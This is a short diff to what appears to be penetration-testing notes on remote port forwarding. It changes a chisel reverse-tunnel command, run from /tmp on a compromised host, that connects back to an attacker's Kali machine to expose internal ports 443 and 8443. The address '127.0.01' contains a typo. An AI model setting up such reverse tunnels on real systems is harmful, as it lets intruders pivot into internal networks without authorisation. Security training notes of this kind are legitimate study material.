@@ -111,7 +111,7 @@ Remote port forwarding allows you to forward a port on the remote server to a lo
 
 ```bash
 chisel server --reverse --port 5000
-/tmp/chisel client kali_ip:5000 R:8001:127.0.0.1:8001 R:8443:127.0.01:8443
+/tmp/chisel client kali_ip:5000 R:443:127.0.0.1:443 R:8443:127.0.01:8443
 curl localhost:8443 # On attacker machine
 ```
 
